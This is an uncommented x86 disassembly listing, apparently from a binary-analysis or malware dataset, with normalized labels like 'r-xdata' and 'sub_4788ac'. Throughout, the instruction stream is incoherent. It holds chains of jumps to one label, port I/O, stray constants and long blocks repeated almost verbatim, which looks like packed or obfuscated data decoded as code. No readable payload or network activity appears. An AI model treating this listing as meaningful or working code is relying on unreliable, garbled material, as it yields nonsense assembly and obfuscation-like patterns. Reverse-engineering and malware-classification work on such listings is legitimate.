jmp r-xdata
sub al 0xf2
cmp eax 0x684f9343
jpo r-xdata
jmp r-xdata
jns r-xdata
jmp r-xdata
adc eax [ edx ]
push ebp
mov eax 0x3df22cef
inc edi
xchg ebx eax
pop ebp
push 0xca137b7b
mov edi 0x5f3ff26b
pop ebx
jpo r-xdata
mov ebx 0x7ea0107e
std
jno r-xdata
xor esp [ ecx + 0x7b ]
jpo r-xdata
mov [ edx + esi * 8 ] gs
cmp eax 0x6863933b
jpo r-xdata
and edi [ ecx + 0x10 ]
jmp r-xdata
mov ebp [ ebx ]
jpo r-xdata
fistp [ ebx + 0x7b ]
jpo r-xdata
mov ebx 0x7b55c692
xchg edx eax
adc [ ebx + 0x7ea0107e ] bh
xchg edx eax
cmp bh [ ecx ]
jpo r-xdata
mov bh 0x93
jmp r-xdata
in eax dx
inc esp
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
sub al 0x92
xchg edx eax
jmp r-xdata
adc [ ebx + 0x22a936f2 ] ecx
adc [ edi ] ecx
sbb eax 0x92af36f2
0x7b40
jmp r-xdata
jmp r-xdata
sbb [ edi ] edi
jpo r-xdata
sub eax 0x713e921f
jpo r-xdata
jae r-xdata
adc ecx edx
jmp r-xdata
pop edi
imul edi [ ebx + 0x7b ] 0x22
xchg edx eax
sub [ ebp + 0x7b ] bh
jpo r-xdata
mov bh 0x93
cmp edi [ ebx + 0x7b ]
jmp r-xdata
jpo r-xdata
sub ebp [ edx + edx * 4 ]
jmp r-xdata
cmp [ ebx + 0x7b ] edi
jmp r-xdata
jpo r-xdata
adc esp [ eax - 0x51 ]
sub ebx [ ecx ]
sub al 0xf2
std
jmp r-xdata
pop ebp
jpo r-xdata
jmp r-xdata
jmp r-xdata
dec eax
mov ebx 0x853ef21d
idiv [ esi ]
mov ebp [ ebx ]
pop edi
out 0x7b eax
jpo r-xdata
push ss
jmp r-xdata
salc
inc ebx
jpo r-xdata
sub dl [ edx - 0x7b7b6e4a ]
jmp r-xdata
jmp r-xdata
push ds
and [ 0x118b3ef2 ] bl
sbb eax 0xf6913ef2
inc bh
add [ esp + eax * 4 + 0x3ebc2c2b ] 0xb141897
pop edi
cmp [ eax - 0x45 ] ecx
sub ebp [ ebx ]
div bh
jmp r-xdata
or eax esi
mov eax 0x849d4792
test [ eax - 0x45 ] cl
and eax 0xebb8b220
jmp r-xdata
mov edx [ ecx ]
add bh [ esi + edi + 0x19545b8b ]
pop ebx
xchg edx eax
sub eax 0xeb84848e
jmp r-xdata
xchg edi eax
sbb [ ebx + ecx ] dl
jpo r-xdata
jmp r-xdata
xchg edx eax
jmp r-xdata
jmp sub_4788ac
sub_478737
pop es
pop edi
outsd
xchg edx eax
mov [ 0xffffffffeb848480 ] al
jmp r-xdata
jpo r-xdata
sub al 0xf2
cmp eax 0x684f9343
jpo r-xdata
jmp r-xdata
jmp r-xdata
adc eax [ edx ]
push ebp
mov eax 0x3df22cef
inc edi
xchg ebx eax
pop ebp
push 0xca137b7b
mov edi 0x5f3ff26b
pop ebx
std
jno r-xdata
xor esp [ ecx + 0x7b ]
jpo r-xdata
mov [ edx + esi * 8 ] gs
cmp eax 0x6863933b
jpo r-xdata
mov ebp [ ebx ]
jpo r-xdata
fistp [ ebx + 0x7b ]
jpo r-xdata
mov ebx 0x7b55c692
xchg edx eax
xchg edx eax
cmp bh [ ecx ]
jpo r-xdata
mov bh 0x93
jmp r-xdata
in eax dx
inc esp
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
sub al 0x92
xchg edx eax
jmp r-xdata
adc [ ebx + 0x22a936f2 ] ecx
adc [ edi ] ecx
sbb eax 0x92af36f2
0x7b40
jmp r-xdata
jmp r-xdata
sbb [ edi ] edi
jpo r-xdata
sub eax 0x713e921f
jpo r-xdata
jae r-xdata
adc ecx edx
jmp r-xdata
pop edi
imul edi [ ebx + 0x7b ] 0x22
xchg edx eax
sub [ ebp + 0x7b ] bh
jpo r-xdata
mov bh 0x93
cmp edi [ ebx + 0x7b ]
jmp r-xdata
jpo r-xdata
sub ebp [ edx + edx * 4 ]
jmp r-xdata
cmp [ ebx + 0x7b ] edi
jmp r-xdata
jpo r-xdata
adc esp [ eax - 0x51 ]
sub ebx [ ecx ]
sub al 0xf2
std
jmp r-xdata
pop ebp
jpo r-xdata
jmp r-xdata
jmp r-xdata
dec eax
mov ebx 0x853ef21d
idiv [ esi ]
mov ebp [ ebx ]
pop edi
out 0x7b eax
jpo r-xdata
push ss
jmp r-xdata
salc
inc ebx
jpo r-xdata
sub dl [ edx - 0x7b7b6e4a ]
jmp r-xdata
jmp r-xdata
push ds
and [ 0x118b3ef2 ] bl
sbb eax 0xf6913ef2
inc bh
add [ esp + eax * 4 + 0x3ebc2c2b ] 0xb141897
pop edi
cmp [ eax - 0x45 ] ecx
sub ebp [ ebx ]
div bh
jmp r-xdata
or eax esi
mov eax 0x849d4792
test [ eax - 0x45 ] cl
and eax 0xebb8b220
jmp r-xdata
mov edx [ ecx ]
add bh [ esi + edi + 0x19545b8b ]
pop ebx
xchg edx eax
sub eax 0xeb84848e
jmp r-xdata
xchg edi eax
sbb [ ebx + ecx ] dl
jpo r-xdata
jmp r-xdata
xchg edx eax
jmp r-xdata
jmp sub_4788ac
sub_478780
in eax dx
lahf
jpo r-xdata
jmp r-xdata
jpo r-xdata
sbb eax 0x22a936f2
inc eax
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
sbb eax 0xf6853ef2
jpo r-xdata
jmp r-xdata
adc edi [ ebx - 0x5 ]
jmp r-xdata
adc [ ebx - 0x7c ] edi
inc ebx
xchg ebx eax
dec edi
push 0x2137b7b
std
jno r-xdata
0x7b40
test eax 0x1d0f1122
[ edi ]
xchg edx eax
test eax 0xeb7b7b64
jmp r-xdata
xchg edx eax
pop ds
push ebx
jpo r-xdata
sbb eax [ eax + 0x7b ]
jpo r-xdata
xor esp [ ecx + 0x7b ]
jpo r-xdata
mov [ edx + esi * 8 ] gs
cmp eax 0x6863933b
jpo r-xdata
mov ebp [ ebx ]
jpo r-xdata
jpo r-xdata
sub al 0xf2
cmp eax 0x684f9343
jmp r-xdata
maxps xmm4 [ ebx - 0x7c ]
sub eax 0x3ccd740f
jg r-xdata
mov [ 0xffffffffae92a0fe ] eax
popad
jpo r-xdata
fistp [ ebx + 0x7b ]
jpo r-xdata
mov ebx 0x7b55c692
xchg edx eax
xchg edx eax
cmp bh [ ecx ]
jpo r-xdata
mov bh 0x93
test bl ch
and dl [ edx + 0x7b7b7d28 ]
jmp r-xdata
push ebp
mov eax 0x3df22cef
inc edi
xchg ebx eax
pop ebp
push 0xca137b7b
adc eax [ edx ]
mov edi 0x5f3ff26b
pop ebx
jpo r-xdata
adc ebp [ esi + 0x2c591f34 ]
cmp eax 0x684f9343
jmp r-xdata
in eax dx
inc esp
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
sub al 0x92
xchg edx eax
jmp r-xdata
dec eax
mov ebx 0x853ef21d
idiv [ esi ]
mov ebp [ ebx ]
adc [ edi ] ecx
sbb eax 0x92af36f2
adc [ ebx + 0x22a936f2 ] ecx
jmp r-xdata
jmp r-xdata
sbb [ edi ] edi
jpo r-xdata
sub eax 0x713e921f
jpo r-xdata
jae r-xdata
adc ecx edx
jmp r-xdata
pop edi
imul edi [ ebx + 0x7b ] 0x22
xchg edx eax
sub [ ebp + 0x7b ] bh
jpo r-xdata
mov bh 0x93
cmp edi [ ebx + 0x7b ]
jmp r-xdata
jpo r-xdata
sub ebp [ edx + edx * 4 ]
jmp r-xdata
cmp [ ebx + 0x7b ] edi
jmp r-xdata
jpo r-xdata
adc esp [ eax - 0x51 ]
sub ebx [ ecx ]
sub al 0xf2
std
jmp r-xdata
pop ebp
jpo r-xdata
jmp r-xdata
jmp r-xdata
pop edi
out 0x7b eax
jpo r-xdata
push ss
jmp r-xdata
salc
inc ebx
jpo r-xdata
sub dl [ edx - 0x7b7b6e4a ]
jmp r-xdata
jmp r-xdata
push ds
and [ 0x118b3ef2 ] bl
sbb eax 0xf6913ef2
inc bh
add [ esp + eax * 4 + 0x3ebc2c2b ] 0xb141897
pop edi
cmp [ eax - 0x45 ] ecx
sub ebp [ ebx ]
div bh
jmp r-xdata
or eax esi
mov eax 0x849d4792
test [ eax - 0x45 ] cl
and eax 0xebb8b220
jmp r-xdata
mov edx [ ecx ]
add bh [ esi + edi + 0x19545b8b ]
pop ebx
xchg edx eax
sub eax 0xeb84848e
jmp r-xdata
xchg edi eax
sbb [ ebx + ecx ] dl
jpo r-xdata
jmp r-xdata
xchg edx eax
jmp r-xdata
jmp sub_4788ac
sub_478831
push cs
pop es
xchg edx eax
test eax 0xeb7b7b64
jmp r-xdata
jpo r-xdata
test bl ch
jmp r-xdata
and dl [ edx + 0x7b7b7d28 ]
jmp r-xdata
dec eax
mov ebx 0x853ef21d
idiv [ esi ]
mov ebp [ ebx ]
std
jno r-xdata
mov ebp [ ebx ]
jpo r-xdata
xchg edx eax
cmp bh [ ecx ]
jpo r-xdata
mov bh 0x93
jmp r-xdata
sub al 0x92
xor esp [ ecx + 0x7b ]
jpo r-xdata
xchg edx eax
jmp r-xdata
jmp r-xdata
fistp [ ebx + 0x7b ]
jpo r-xdata
pop edi
imul edi [ ebx + 0x7b ] 0x22
xchg edx eax
sub [ ebp + 0x7b ] bh
jpo r-xdata
mov bh 0x93
cmp [ ebx + 0x7b ] edi
jmp r-xdata
in eax dx
inc esp
jpo r-xdata
adc [ ebx + 0x22a936f2 ] ecx
adc [ edi ] ecx
sbb eax 0x92af36f2
0x7b40
jmp r-xdata
jmp r-xdata
cmp edi [ ebx + 0x7b ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc esp [ eax - 0x51 ]
sub ebx [ ecx ]
sub al 0xf2
std
pop ebp
jpo r-xdata
jmp r-xdata
jmp r-xdata
pop edi
out 0x7b eax
jpo r-xdata
push ss
jmp r-xdata
salc
inc ebx
jpo r-xdata
sub dl [ edx - 0x7b7b6e4a ]
jmp r-xdata
jmp r-xdata
push ds
and [ 0x118b3ef2 ] bl
sbb eax 0xf6913ef2
inc bh
add [ esp + eax * 4 + 0x3ebc2c2b ] 0xb141897
pop edi
cmp [ eax - 0x45 ] ecx
sub ebp [ ebx ]
div bh
jmp r-xdata
or eax esi
mov eax 0x849d4792
test [ eax - 0x45 ] cl
and eax 0xebb8b220
jmp r-xdata
mov edx [ ecx ]
add bh [ esi + edi + 0x19545b8b ]
pop ebx
xchg edx eax
sub eax 0xeb84848e
jmp r-xdata
xchg edi eax
sbb [ ebx + ecx ] dl
jpo r-xdata
jmp r-xdata
xchg edx eax
jmp r-xdata
jmp sub_4788ac
sub_4788ac
push 0x4e
jpo r-xdata
cmp [ eax - 0x45 ] ecx
sub ebp [ ebx ]
div bh
pop edi
out 0x7b eax
jpo r-xdata
salc
inc ebx
jpo r-xdata
sub dl [ edx - 0x7b7b6e4a ]
jmp r-xdata
push ds
and [ 0x118b3ef2 ] bl
sbb eax 0xf6913ef2
inc bh
add [ esp + eax * 4 + 0x3ebc2c2b ] 0xb141897
pop edi
or eax esi
mov eax 0x849d4792
test [ eax - 0x45 ] cl
and eax 0xebb8b220
jmp r-xdata
mov edx [ ecx ]
add bh [ esi + edi + 0x19545b8b ]
pop ebx
xchg edx eax
sub eax 0xeb84848e
jmp r-xdata
xchg edi eax
sbb [ ebx + ecx ] dl
sub_4788b1
mov ebx 0x7b5d1692
jpo r-xdata
jmp r-xdata
r-xdata
test esi esi
mov ebp [ ebx ]
jpo r-xdata
mov eax 0xebebebeb
jmp r-xdata
jmp r-xdata
std
out dx eax
jpo r-xdata
cmp edi [ ebx + 0x7b ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc esp [ eax - 0x51 ]
sub ebx [ ecx ]
sub al 0xf2
jmp r-xdata
test eax 0x1d0f1122
[ edi ]
xchg edx eax
std
fistp [ ebx + 0x7b ]
jpo r-xdata
imul edi [ ebx + 0x7b ] 0x2baf6013
sbb [ edx + esi * 8 ] ebp
pop ebp
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
in eax dx
inc esp
pop edi
out 0x7b eax
jpo r-xdata
push ss
jmp r-xdata
0x7b40
adc [ ebx + 0x22a936f2 ] ecx
adc [ edi ] ecx
sbb eax 0x92af36f2
salc
inc ebx
jpo r-xdata
sub dl [ edx - 0x7b7b6e4a ]
jmp r-xdata
jmp r-xdata
push ds
and [ 0x118b3ef2 ] bl
sbb eax 0xf6913ef2
inc bh
add [ esp + eax * 4 + 0x3ebc2c2b ] 0xb141897
pop edi
cmp [ eax - 0x45 ] ecx
sub ebp [ ebx ]
div bh
jmp r-xdata
or eax esi
mov eax 0x849d4792
test [ eax - 0x45 ] cl
and eax 0xebb8b220
jmp r-xdata
mov edx [ ecx ]
add bh [ esi + edi + 0x19545b8b ]
pop ebx
xchg edx eax
sub eax 0xeb84848e
jmp r-xdata
xchg edi eax
sbb [ ebx + ecx ] dl
jpo r-xdata
jmp r-xdata
xchg edx eax
jmp r-xdata
jmp sub_4788ac
sub_4788d6
add [ ebx ] edi
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov es [ esp + eax * 4 - 0x14141415 ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
adc al 0xb
dec ecx
pop ebp
jpo r-xdata
add bh [ esi + edi + 0x19545b8b ]
pop ebx
xchg edx eax
xchg edi eax
sbb [ ebx + ecx ] dl
sub eax 0xeb84848e
jmp r-xdata
mov esp 0x1418973e
or eax [ edx ]
mov esp 0x545b8b3e
jmp r-xdata
pop edi
out 0x7b eax
jpo r-xdata
jpo r-xdata
salc
inc ebx
jpo r-xdata
sub dl [ edx - 0x7b7b6e4a ]
jmp r-xdata
xchg edx eax
jpo r-xdata
push ds
and [ 0x118b3ef2 ] bl
sbb eax 0xf6913ef2
inc bh
add [ esp + eax * 4 + 0x3ebc2c2b ] 0xb141897
pop edi
cmp [ eax - 0x45 ] ecx
sub ebp [ ebx ]
div bh
jpo r-xdata
xchg edx eax
mov dh 0x91
test [ ebx + ebp * 8 - 0x14141415 ] al
xchg edx eax
or eax esi
mov eax 0x849d4792
test [ eax - 0x45 ] cl
and eax 0xebb8b220
jmp r-xdata
mov edx [ ecx ]
jpo r-xdata
jmp r-xdata
sbb [ ebx - 0x6e ] ebx
pop ebx
push esp
sub al 0x92
pop es
jne r-xdata
jpo r-xdata
pop es
jmp r-xdata
jpo r-xdata
sub_4788f0
xchg ecx eax
and [ ecx ] edx
push cs
xchg edx eax
jpo r-xdata
out 0x7b eax
jpo r-xdata
jpo r-xdata
salc
inc ebx
jpo r-xdata
sub dl [ edx - 0x7b7b6e4a ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
push ds
and [ 0x118b3ef2 ] bl
sbb eax 0xf6913ef2
inc bh
add [ esp + eax * 4 + 0x3ebc2c2b ] 0xb141897
pop edi
cmp [ eax - 0x45 ] ecx
sub ebp [ ebx ]
div bh
and dl [ edx + 0x7b7b60c6 ]
sbb eax 0x11952ef2
push ss
jmp r-xdata
or eax esi
mov eax 0x849d4792
test [ eax - 0x45 ] cl
and eax 0xebb8b220
jmp r-xdata
mov edx [ ecx ]
add bh [ esi + edi + 0x19545b8b ]
pop ebx
xchg edx eax
sub eax 0xeb84848e
jmp r-xdata
xchg edi eax
sbb [ ebx + ecx ] dl
jmp r-xdata
jpo r-xdata
jmp r-xdata
xchg edx eax
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp sub_4788ac
cmp edi [ ebx + 0x7b ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc esp [ eax - 0x51 ]
sub ebx [ ecx ]
sub al 0xf2
std
fistp [ ebx + 0x7b ]
jpo r-xdata
pop ebp
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
in eax dx
inc esp
jpo r-xdata
pop edi
push ss
adc [ ebx + 0x22a936f2 ] ecx
adc [ edi ] ecx
sbb eax 0x92af36f2
0x7b40
sub_478905
dec esp
jpo r-xdata
inc eax
mov eax 0x70aafd74
jpo r-xdata
jmp r-xdata
movsd [ edi ] [ esi ]
pop ebx
jpo r-xdata
je r-xdata
xchg edx eax
jpo r-xdata
test bl ch
jmp r-xdata
jmp r-xdata
jmp r-xdata
outsd
or dl [ edx + 0x7b7b7bcc ]
jmp r-xdata
out 0x7b eax
jpo r-xdata
jpo r-xdata
xchg edx eax
push 0xeb848489
jmp r-xdata
jmp r-xdata
test [ eax + eax * 2 - 0x55028b48 ] al
jo r-xdata
salc
inc ebx
jpo r-xdata
sub dl [ edx - 0x7b7b6e4a ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
insd
jpo r-xdata
jpo r-xdata
xchg edx eax
jpo r-xdata
push ds
sbb eax 0xf6913ef2
inc bh
add [ esp + eax * 4 + 0x3ebc2c2b ] 0xb141897
pop edi
cmp [ eax - 0x45 ] ecx
sub ebp [ ebx ]
div bh
and dl [ edx + 0x7b7b60c6 ]
sbb eax 0x11952ef2
push ss
jmp r-xdata
mov eax 0x8483e792
test [ ebx + 0x7b7b772e ] dl
clc
jmp r-xdata
and [ 0x118b3ef2 ] bl
adc [ esi ] ebx
jpo r-xdata
stosb [ edi ]
sbb eax 0x928b2ef2
int3
or eax esi
mov eax 0x849d4792
test [ eax - 0x45 ] cl
and eax 0xebb8b220
jmp r-xdata
mov edx [ ecx ]
add bh [ esi + edi + 0x19545b8b ]
pop ebx
xchg edx eax
sub eax 0xeb84848e
jmp r-xdata
xchg edi eax
sbb [ ebx + ecx ] dl
jmp r-xdata
xchg ebx eax
pop esi
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
inc eax
r-xdata
xchg edx eax

jmp r-xdata
xchg edx eax
jmp [ ebx ]
jmp r-xdata
inc ecx
inc ecx
jpo r-xdata
inc [ edi ]
add [ esp + eax * 4 - 0xf78c17c ] 0x3e
xchg [ eax + 0x3e ] eax
xor [ ecx + edi * 8 + 0x48 ] 0x7f
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg [ esp + eax * 4 + 0x11231411 ] eax
jmp r-xdata
test [ eax - 0x60 ] cl
sub [ edx - 0x7b7b7b2b ] dl
jmp r-xdata
xchg edx eax
jmp sub_4788ac
cmp edi [ ebx + 0x7b ]
jmp r-xdata
jpo r-xdata
or ebx [ 0x475f3ff2 ]
xchg edx eax
and eax [ edi + 0x14118484 ]
and edx [ ecx ]
jpo r-xdata
dec eax
jg r-xdata
jmp r-xdata
jpo r-xdata
adc esp [ eax - 0x51 ]
sub ebx [ ecx ]
sub al 0xf2
std
fistp [ ebx + 0x7b ]
jpo r-xdata
xchg [ esp + eax * 4 + 0x7b74e693 ] al
jmp r-xdata
test [ eax + ecx * 2 - 0x2a6dd760 ] al
test [ esp + eax * 4 + 0x1d0d11eb ] al
mov edi 0xf21da948
mov ebp 0x92121121
jpo r-xdata
pop ebp
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
in eax dx
inc esp
jpo r-xdata
mov bh [ ecx ]
xchg edx eax
add [ ebx + 0x7b ] edi
jpo r-xdata
cmovge edi [ ebx + 0x7b ]
inc [ esp + esi * 2 + 0x7b6158ff ]
jpo r-xdata
or eax 0xbf2ef21d
dec eax
test eax 0xbd2ef21d
and [ ecx ] edx
adc dl [ edx + 0x7b7b5121 ]
adc [ 0xffffffffbf2ef21d ] ecx
jmp r-xdata
stc
inc edx
mov al [ esp + eax * 4 + 0x7884f83c ]
push eax
imul edi [ ebx + 0x7b ] 0x97f02eeb
sub dl [ edx + 0x7b7b529c ]
jmp r-xdata
pop edi
push ss
adc [ ebx + 0x22a936f2 ] ecx
adc [ edi ] ecx
sbb eax 0x92af36f2
0x7b40
jpo r-xdata
xchg ebx eax
adc ecx [ eax + 0x2c281e0f ]
cmp eax 0x7fe89223
jpo r-xdata
popfd
inc ebx
jpo r-xdata
jg r-xdata
and [ ecx + 0x7b ] edx
jpo r-xdata
xchg edx eax
mov ebp 0x84869f92
test bl ch
jmp r-xdata
sub esi esi
[ ebx ]
jmp r-xdata
xor eax 0xeb7b7b41
jmp r-xdata
jmp r-xdata
stosd [ edi ]
jpo r-xdata
pop eax
je r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
jpo r-xdata
jpo r-xdata
mov edi 0x74bbfe77
sub [ ebx + edi * 2 + 0x7b ] dh
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov edi 0x50a89277
jpo r-xdata
jpo r-xdata
mov ebp 0x7b76df92
popad
jpo r-xdata
jmp r-xdata
mov ebp 0xa5f01211
xchg edx eax
xchg edx eax
mov eax [ gs : esp + eax * 4 - 0x14141415 ]
jmp r-xdata
jmp r-xdata
test [ edx + esi * 8 + 0x7b7b8ffd ] al
jpo r-xdata
sub al 0x92
and bl [ 0xfffffffff0cf26f2 ]
mov [ 0xffffffff848b6592 ] eax
test bl ch
jmp r-xdata
movsd [ edi ] [ esi ]
clc
adc dh al
std
and [ edx + 0x7b7b4135 ] dl
jmp r-xdata
aas
dec ebx
jpo r-xdata
pop edi
sub_47894b
and dl [ edx + 0x7b7b47bb ]
sub eax 0xeb84848e
jmp r-xdata
jpo r-xdata
xchg edi eax
sbb [ ebx + ecx ] dl
pop es
dec ecx
jmp r-xdata
mov esp 0x1418973e
or eax [ edx ]
mov esp 0x545b8b3e
jmp r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
salc
inc ebx
jpo r-xdata
jpo r-xdata
push ds
and [ 0x118b3ef2 ] bl
add bh [ esi + edi + 0x19545b8b ]
pop ebx
xchg edx eax
sbb eax 0xf6913ef2
inc bh
add [ esp + eax * 4 + 0x3ebc2c2b ] 0xb141897
jpo r-xdata
xchg edx eax
mov dh 0x91
test [ ebx + ebp * 8 - 0x14141415 ] al
xchg edx eax
or eax esi
mov eax 0x849d4792
test [ eax - 0x45 ] cl
and eax 0xebb8b220
jmp r-xdata
mov edx [ ecx ]
jpo r-xdata
jmp r-xdata
sbb [ ebx - 0x6e ] ebx
pop ebx
push esp
sub al 0x92
pop es
jne r-xdata
sub_478a50
push esi
jpo r-xdata
xchg [ eax + 0x3e ] eax
xor [ ecx + edi * 8 + 0x48 ] 0x7f
jpo r-xdata
jmp r-xdata
test [ eax - 0x60 ] cl
sub [ edx - 0x7b7b7b2b ] dl
jmp r-xdata
xchg edx eax
test [ eax - 0x6e ] bh
jpo r-xdata
dec eax
jg r-xdata
insd
jpo r-xdata
xchg [ esp + eax * 4 + 0x7b74e693 ] al
jmp r-xdata
test [ eax + ecx * 2 - 0x2a6dd760 ] al
test [ esp + eax * 4 + 0x1d0d11eb ] al
mov edi 0xf21da948
mov ebp 0x92121121
jpo r-xdata
mov eax 0x8483e792
test [ ebx + 0x7b7b772e ] dl
clc
jmp r-xdata
mov bh [ ecx ]
xchg edx eax
add [ ebx + 0x7b ] edi
jpo r-xdata
cmovge edi [ ebx + 0x7b ]
inc [ esp + esi * 2 + 0x7b6158ff ]
jpo r-xdata
or eax 0xbf2ef21d
dec eax
test eax 0xbd2ef21d
and [ ecx ] edx
adc dl [ edx + 0x7b7b5121 ]
adc [ 0xffffffffbf2ef21d ] ecx
jmp r-xdata
push 0xeb848489
jmp r-xdata
stc
inc edx
mov al [ esp + eax * 4 + 0x7884f83c ]
xchg edx eax
push eax
imul edi [ ebx + 0x7b ] 0x97f02eeb
sub dl [ edx + 0x7b7b529c ]
jmp r-xdata
xchg ebx eax
pop esi
jpo r-xdata
jpo r-xdata
xchg ebx eax
adc ecx [ eax + 0x2c281e0f ]
cmp eax 0x7fe89223
jpo r-xdata
popfd
inc ebx
jpo r-xdata
jg r-xdata
jpo r-xdata
inc eax
r-xdata
and [ ecx + 0x7b ] edx
jpo r-xdata
xchg edx eax
mov ebp 0x84869f92
test bl ch
jmp r-xdata
sub esi esi
[ ebx ]
jmp r-xdata
xor eax 0xeb7b7b41
jmp r-xdata
jmp r-xdata
stosd [ edi ]
jpo r-xdata
jmp [ ebx ]
jmp r-xdata
inc ecx
inc ecx
jpo r-xdata
inc [ edi ]
add [ esp + eax * 4 - 0xf78c17c ] 0x3e
pop eax
je r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
xchg [ esp + eax * 4 + 0x11231411 ] eax
jmp r-xdata
jpo r-xdata
xchg edx eax
jpo r-xdata
jpo r-xdata
mov edi 0x74bbfe77
sub [ ebx + edi * 2 + 0x7b ] dh
or ebx [ 0x475f3ff2 ]
xchg edx eax
and eax [ edi + 0x14118484 ]
and edx [ ecx ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov edi 0x50a89277
jpo r-xdata
jpo r-xdata
mov ebp 0x7b76df92
popad
jpo r-xdata
jmp r-xdata
mov ebp 0xa5f01211
xchg edx eax
xchg edx eax
mov eax [ gs : esp + eax * 4 - 0x14141415 ]
jmp r-xdata
jmp r-xdata
test [ edx + esi * 8 + 0x7b7b8ffd ] al
jpo r-xdata
sub al 0x92
and bl [ 0xfffffffff0cf26f2 ]
mov [ 0xffffffff848b6592 ] eax
test bl ch
jmp r-xdata
movsd [ edi ] [ esi ]
clc
adc dh al
std
and [ edx + 0x7b7b4135 ] dl
jmp r-xdata
aas
dec ebx
jpo r-xdata
pop edi
sub_478a7c
push es
rcl [ ecx ] 0xe
xchg edx eax
test eax 0xeb84848b
jmp r-xdata
xchg edx eax
push 0xeb848489
jmp r-xdata
insd
jpo r-xdata
mov eax 0x8483e792
test [ ebx + 0x7b7b772e ] dl
clc
jmp r-xdata
xchg ebx eax
pop esi
jpo r-xdata
jpo r-xdata
inc eax
r-xdata
jmp [ ebx ]
jmp r-xdata
inc ecx
inc ecx
jpo r-xdata
inc [ edi ]
add [ esp + eax * 4 - 0xf78c17c ] 0x3e
xchg [ eax + 0x3e ] eax
xor [ ecx + edi * 8 + 0x48 ] 0x7f
jpo r-xdata
xchg [ esp + eax * 4 + 0x11231411 ] eax
jmp r-xdata
test [ eax - 0x60 ] cl
sub [ edx - 0x7b7b7b2b ] dl
jmp r-xdata
xchg edx eax
or ebx [ 0x475f3ff2 ]
xchg edx eax
and eax [ edi + 0x14118484 ]
and edx [ ecx ]
jpo r-xdata
dec eax
jg r-xdata
xchg [ esp + eax * 4 + 0x7b74e693 ] al
jmp r-xdata
test [ eax + ecx * 2 - 0x2a6dd760 ] al
test [ esp + eax * 4 + 0x1d0d11eb ] al
mov edi 0xf21da948
mov ebp 0x92121121
jpo r-xdata
mov bh [ ecx ]
xchg edx eax
add [ ebx + 0x7b ] edi
jpo r-xdata
cmovge edi [ ebx + 0x7b ]
inc [ esp + esi * 2 + 0x7b6158ff ]
jpo r-xdata
or eax 0xbf2ef21d
dec eax
test eax 0xbd2ef21d
and [ ecx ] edx
adc dl [ edx + 0x7b7b5121 ]
adc [ 0xffffffffbf2ef21d ] ecx
jmp r-xdata
stc
inc edx
mov al [ esp + eax * 4 + 0x7884f83c ]
push eax
imul edi [ ebx + 0x7b ] 0x97f02eeb
sub dl [ edx + 0x7b7b529c ]
jmp r-xdata
jpo r-xdata
xchg ebx eax
adc ecx [ eax + 0x2c281e0f ]
cmp eax 0x7fe89223
jpo r-xdata
popfd
inc ebx
jpo r-xdata
jg r-xdata
and [ ecx + 0x7b ] edx
jpo r-xdata
xchg edx eax
mov ebp 0x84869f92
test bl ch
jmp r-xdata
sub esi esi
[ ebx ]
jmp r-xdata
xor eax 0xeb7b7b41
jmp r-xdata
jmp r-xdata
stosd [ edi ]
jpo r-xdata
pop eax
je r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
jpo r-xdata
jpo r-xdata
mov edi 0x74bbfe77
sub [ ebx + edi * 2 + 0x7b ] dh
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov edi 0x50a89277
jpo r-xdata
jpo r-xdata
mov ebp 0x7b76df92
popad
jpo r-xdata
jmp r-xdata
mov ebp 0xa5f01211
xchg edx eax
xchg edx eax
mov eax [ gs : esp + eax * 4 - 0x14141415 ]
jmp r-xdata
jmp r-xdata
test [ edx + esi * 8 + 0x7b7b8ffd ] al
jpo r-xdata
sub al 0x92
and bl [ 0xfffffffff0cf26f2 ]
mov [ 0xffffffff848b6592 ] eax
test bl ch
jmp r-xdata
movsd [ edi ] [ esi ]
clc
adc dh al
std
and [ edx + 0x7b7b4135 ] dl
jmp r-xdata
aas
dec ebx
jpo r-xdata
pop edi
sub_478c4b
push ebp
sbb eax 0x228936f2
sbb eax 0xf08f36f2
mov bl 0x1d
adc [ edx + 0x7b7b684d ] 0x8af02deb
xchg edx eax
sub ebx [ ebx + 0x7b ]
jpo r-xdata
xchg ebx eax
dec eax
push esi
jpo r-xdata
jpo r-xdata
and ah [ edx ]
xchg edx eax
mov ebp 0xa5f01211
xchg edx eax
jpo r-xdata
jpo r-xdata
and bl [ 0xfffffffff0cf26f2 ]
mov [ 0xffffffff848b6592 ] eax
test bl ch
jmp r-xdata
movsd [ edi ] [ esi ]
clc
mov edi 0x50a89277
jpo r-xdata
jpo r-xdata
mov ebp 0x7b76df92
xchg edx eax
mov eax [ gs : esp + eax * 4 - 0x14141415 ]
jmp r-xdata
jmp r-xdata
test [ edx + esi * 8 + 0x7b7b8ffd ] al
jpo r-xdata
jmp r-xdata
jmp r-xdata
adc dh al
std
and [ edx + 0x7b7b4135 ] dl
jmp r-xdata
aas
dec ebx
jpo r-xdata
popad
jpo r-xdata
jmp r-xdata
pop edi
jpo r-xdata
